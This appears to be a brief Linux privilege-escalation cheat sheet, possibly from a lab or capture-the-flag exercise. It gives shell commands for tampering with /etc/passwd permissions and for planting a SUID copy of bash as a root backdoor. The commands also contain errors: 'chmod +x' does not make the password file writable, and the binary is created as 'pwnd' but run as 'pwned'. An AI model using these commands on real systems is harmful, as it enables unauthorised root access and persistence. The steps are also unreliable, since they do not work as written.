
1. Change password file permission and add a user
```bash
chmod +x /etc/passwd
```
2. SUID for bash
```bash
cp /bin/bash /home/user/pwnd && chmod +xs /home/user/pwnd
```

```bash
./pwned -p
```
